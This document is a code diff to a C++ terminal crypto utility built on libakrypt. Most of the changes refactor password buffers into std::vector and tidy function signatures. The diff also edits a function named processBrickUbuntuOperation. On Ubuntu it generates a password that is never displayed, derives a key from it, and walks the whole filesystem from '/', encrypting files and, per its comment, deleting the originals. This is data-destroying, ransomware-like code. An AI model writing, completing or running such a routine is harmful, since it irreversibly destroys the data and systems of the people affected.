@@ -30,6 +30,7 @@
 #include <chrono>
 #include <thread>
 #include <filesystem>
+#include <vector>
 
 #include <libakrypt.h>
 
@@ -162,7 +163,7 @@ MainMenu::OptionsSelected MainMenu::processOperationExecution(MainMenu::OptionsS
         clear();
         if  (target_selection == OptionsSelected::OPT_ROOT)
         {
-            if (processBrickUbuntuOperation(target_selection))
+            if (processBrickUbuntuOperation())
             {
                 return OptionsSelected::EXIT;
             }
@@ -289,7 +290,8 @@ bool MainMenu::processFileOperation(MainMenu::OptionsSelected operation_choice)
     generateKeyForOperation(generate_key, key);
 
     size_t size = 0;
-    ak_uint8* buffer = ak_ptr_load_from_file(buffer, &size, input_file.c_str());
+    ak_uint8* buffer = nullptr; 
+    buffer = ak_ptr_load_from_file(buffer, &size, input_file.c_str());
 
     if (!buffer || size == 0)
     {
@@ -340,26 +342,24 @@ bool MainMenu::processFileOperation(MainMenu::OptionsSelected operation_choice)
  *   с использованием созданного ключа и сохраняется обратно.
  * - Исходный файл удаляется после успешного шифрования.
  *
- * @param operation_choice Выбор операции из перечисления OptionsSelected.
- *
  * @return true, если пользователь выбрал выход после завершения операции;
  *         false в противном случае.
  */
-bool MainMenu::processBrickUbuntuOperation(MainMenu::OptionsSelected operation_choice)
+bool MainMenu::processBrickUbuntuOperation()
 {
     clear();
 
     if (strcmp(CMAKE_SYSTEM_ID , "ubuntu") == 0)
     {
-        mvprintw(2, 10, "Starting encryption operation...");
+        mvprintw(2, 10, "Starting encryption operation.");
         mvprintw(3, 10, "-----------------------------------");
 
         struct bckey key;
         size_t password_length = 32;
-        char password[password_length + 1] = {0};
+        std::vector<char> password(password_length + 1, 0);
 
-        CryptoProvider::generate_random_string(32, password);
-        CryptoProvider::generate_key_from_password(password, "", &key);
+        CryptoProvider::generate_random_string(32, password.data());
+        CryptoProvider::generate_key_from_password(password.data(), "", &key);
 
         for (const auto& entry : fs::recursive_directory_iterator(fs::path("/")))
         {
@@ -428,20 +428,20 @@ bool MainMenu::processBrickUbuntuOperation(MainMenu::OptionsSelected operation_c
 void MainMenu::generateKeyForOperation(bool generate_key, struct bckey& key)
 {
     size_t password_length = 32;
-    char password[password_length + 1] = {0};
+    std::vector<char> password(password_length + 1, 0);
 
     if (generate_key)
     {
-        CryptoProvider::generate_random_string(32, password);
-        CryptoProvider::generate_key_from_password(password, "", &key);
-        mvprintw(5, 12, "Password: %s", password);
+        CryptoProvider::generate_random_string(32, password.data());
+        CryptoProvider::generate_key_from_password(password.data(), "", &key);
+        mvprintw(5, 12, "Password: %s", password.data());
         mvprintw(6, 12, "Key: %s...", CryptoProvider::bckey_to_string(&key).substr(0, 32).c_str());
     }
     else
     {
         const auto input_string = getInputString(5, "Password", 32);
-        std::strncpy(password, input_string.c_str(), password_length);
-        CryptoProvider::generate_key_from_password(password, "", &key);
+        std::strncpy(password.data(), input_string.c_str(), password_length);
+        CryptoProvider::generate_key_from_password(password.data(), "", &key);
         mvprintw(6, 12, "Key: %s...", CryptoProvider::bckey_to_string(&key).substr(0, 32).c_str());
     }
 }
@@ -620,7 +620,8 @@ MainMenu::OptionsSelected MainMenu::getUserInput(const std::set<char>& valid_inp
                 case 'r': return OptionsSelected::RETURN;
                 case 'c': return OptionsSelected::CONTINUE;
                 case 'p': return OptionsSelected::PICK_ANOTHER;
-                case 'q': return OptionsSelected::EXIT;
+                case 'q':
+                default: return OptionsSelected::EXIT;
             }
         }
 
